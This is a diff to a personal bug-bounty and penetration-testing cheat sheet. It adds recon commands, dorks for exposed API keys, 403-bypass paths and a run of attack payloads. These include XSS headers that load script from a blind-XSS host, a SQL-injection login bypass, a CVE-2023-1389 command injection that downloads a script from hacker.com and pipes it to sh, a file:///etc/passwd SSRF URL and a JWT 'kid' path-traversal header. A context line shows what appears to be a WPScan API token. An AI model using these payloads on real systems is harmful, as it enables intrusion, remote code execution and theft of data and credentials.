@@ -3,14 +3,26 @@ $ wpscan --url https://target.com --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaD
 
 Prerequesics: 	
 	install go lang
-  1) sudo apt install -y golang
-  2) export GOROOT=/usr/lib/go
-  3) export GOPATH=$HOME/go
-  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
-  5) source .bashrc
- 
- 
-
+	  1) sudo apt install -y golang
+	  2) export GOROOT=/usr/lib/go
+	  3) export GOPATH=$HOME/go
+	  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+	  5) source .bashrc
+download postman
+	$ sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
+	$ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt
+	$ sudo ln -s /opt/Postman/Postman /usr/bin/postman
+	127.0.0.1:5555
+explore api endpoints with kiterunner
+	$ git clone https://github.com/assetnote/kiterunner.git
+	$ cd kiterunner
+	$ make build
+	$ sudo ln -s $(pwd)/dist/kr /usr/local/bin/kr
+wordlists 
+1- curl https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2021_06_28.txt >
+latest_api_wordlist.txt
+2- wget -r --no-parent -R "index.html*" https://wordlists-cdn.assetnote.io/data/ -nH
+3- 
 ------------------------------------------------------------------------------------------------------------------------------------
 Subdomain Enumeration
 1- amass enum -active -d hackerone.com -src -dir h1_amass -o output_h1_active.txt -rf 50resolvers.txt -config /home/.config/amass/config.ini
@@ -166,7 +178,7 @@ python3 dirsearch.py -e php,html,js -u https://geeksforgeeks.org –proxy 127.0.
 	shodan_api_key extension:sh
 	shodan_api_key extension:json
 	shodan_api_key extension:rb
-	
+	"api_key" , "apiKey" , "api key" "api-key" "API-KEY" "token" "API_KEY"
 3- 
 	GET /phpinfo.php HTTP/1.1
 	Host: hossam.com\r\n
@@ -183,6 +195,7 @@ python3 dirsearch.py -e php,html,js -u https://geeksforgeeks.org –proxy 127.0.
 
 ## Google dorking :-
 - site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
+- intitle:"index.of" intext:"api.txt"  ==> find api key files
 - intext:"index of /.git"
 - site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" |
 intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" |
@@ -192,11 +205,13 @@ link:www.telegram.com |
 link:www.hackerone.com | link:www.slack.com | link:www.github.com
 - inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
 - inurl:/geoserver/ows?service=wfs
+- intitle:"index of" api_key OR "api key" OR apiKey -pool 
 
 
 -----------------------------------------------------------------------------------------------------
 Nmap 
 nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt 
+nmap -sS -sV -vv -n -Pn -T5 192.168.1.1-255 -p80 -oG - | grep 'open'
 nmap 192.168.1.1 -Pn -sS -A -sV -sC -p ......  --script=vuln
 nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting)
 nc -nvz 192.168.1.4 1-65535
@@ -227,6 +242,7 @@ Directory Enumeration
 	- gobuster dir -w Seclists/Discovery/Web-Content/raft-small-word.txt
 	- gobuster fuzz -w 
 	-  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+	-  
 	-https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters	=> parameters
 	-list ==> https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
 	-https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux	==> wordlist for linux 
@@ -237,7 +253,7 @@ Directory Enumeration
 	
 3- 	# ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
 4-	kiterunner wordlists => https://wordlists.assetnote.io/
-5- ks scan -w /home/wordlists/data/kiterunner/routes-large.txt
+5- ks scan -w /home/wordlists/data/kiterunner/routes-large.txt	--proxy=http://127.0.0.1:8080 http://example.com
 6- if found api 
 	- use api as intended
 	- reverse engineer docs 
@@ -249,8 +265,21 @@ Directory Enumeration
 	- Mitmproxy2swagger
 	
 7-  /api/v1/account?name=Cloud+Strife
+	user/:id
+	/user/{id}
+	/user/2727
+	/account/:username
+	/account/{username}
+	/account/hossam
 
 8-  Look through docs/collection for relevant requests 
+		https://example.com/docs
+		https://example.com/api/docs
+		https://docs.example.com
+		https://dev.example.com/docs
+		https://developer.example.com/docs
+		https://api.example.com/docs
+		https://example.com/developers/documentation
 	- seek out responses that provide you with request ID 
 	- make request as User A for User B's resources 
 	Apply Your Skills
@@ -272,6 +301,7 @@ Step 3 : First use dictionary attack with SecLists (https://github.com/danielmie
 Step 4 : Either use your customized list or use the ones which I have provided in the above step.
 Step 5 : Then simply start the attack, start checking for 200 status.
 Step 7 : Once there is HTTP 200 OK status, start the recursive scan on the same endpoint for juicy information like swagger doc and so on.
+	- try to find swagger.json file and import it into postman
 step 8 : Other method is to change the API version and try bruteforcing the same endpoint
 Eg: Redacted.com/api/v1/{Endpoint} ----- Redacted.com/api/v2/{Endpoint}
 
@@ -447,6 +477,19 @@ Check
 site.com/secret	=> 403
 site.com/secret/*	=> 200
 site.com/secret/./	=> 200
+site.com/secret/.
+site.com/secret//
+site.com/secret/..
+site.com/;/secret
+site.com/.;/secret
+site.com//;//secret
+site.com/secret.json
+/%2e/secret
+/%252e/secret
+/%ef%bc%8fsecret
+//secret
+/SECRET
+
 change HTTP/1.1	TO HTTP/1.0
 
 site.com/secret.txt	=> 403
@@ -681,6 +724,11 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 	
 	PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
 16- using intruder search for xss payloads and put them into intruder and try to open every link and see
+17- headers: 
+	Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
+	User-Agent: \"><script src=https://chirag.bxss.in></script>"
+	Referer: \"><script src=https://chirag.bxss.in></script>"
+	
 
 ------------------------------------------------------------------------------------------------------------
 Blind XSS 
@@ -688,6 +736,7 @@ Blind XSS
 inurl:"contact-form"
 	## Go to xss.report website and create an account to test for blind xss Vulnerbilitites
 2- Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
 3- cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
@@ -1003,6 +1052,7 @@ Hidden params
 1- 	Gather all urls => wayback , gau , hackcrawler , 
 	Arjun => https://github.com/s0md3v/Arjun
 	- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
+	- arjun -i targets.txt -w burp-parameter-names.txt
 2- paramspider
 	- python3 paramspider.py --domain indrive.com
 	- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output file.txt
@@ -1060,7 +1110,11 @@ batch --random-agent --level 1 | tee sqlmap.txt
 11- sqlmap -r request.txt --ignore-code 401
 12- search for sqli payloads and put them into intruder => 	Bypass login panel with common login SQL injection payloads using Burpsuite intruder.
 13- check if http not https => clear text transmittion
-14- 
+14- {	"username":"admin",
+	"password":"' OR 1=0--"}
+15- inject  cve 2023-1389
+	operation=write&country=$(id>`wget http://hacker.com| sh)
+16- ext:php inurl:"api.php?action="		==> sql injection
 
 ------------------------------------------------------------------------------------------------------
 Blind Sqli
@@ -1077,6 +1131,9 @@ httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 20
 file=../../../../../../etc/passwd => 403
 file=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==	=> base64 encoding => 200
 ../../../../../../../../etc/passwd{{	=>200
+CVE 2021-41277
+https://example.com/api/geojson?url=file:///etc/passwd
+
 
 
 
@@ -1197,7 +1254,7 @@ tools:
 Httpx 
 
  cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
-- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
+- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php  | grep 'phpinfo()'
 - httpx -L live_subs.txt -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
 - httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
 -CVE 2023-23752
@@ -1257,7 +1314,11 @@ JWT
 2- change user role and alg to "none" and remove signature and leave . after payload
 3-   22- to crack secret of jwt token::: => # hashcat  -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ   rockyou.txt --show
 
-
+{
+"alg":"HS256",
+"typ":"JWT",
+"kid": "../../../../../../dev/null"
+}
 
 
 
@@ -1494,6 +1555,7 @@ Default Credinals
  5- #hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s <port> http-get /
 
 ---------------------------------------------------------------------------------------------------------------------------------------------
-
+Resources: 
+https://github.com/hAPI-hacker/Hacking-APIs
 
 
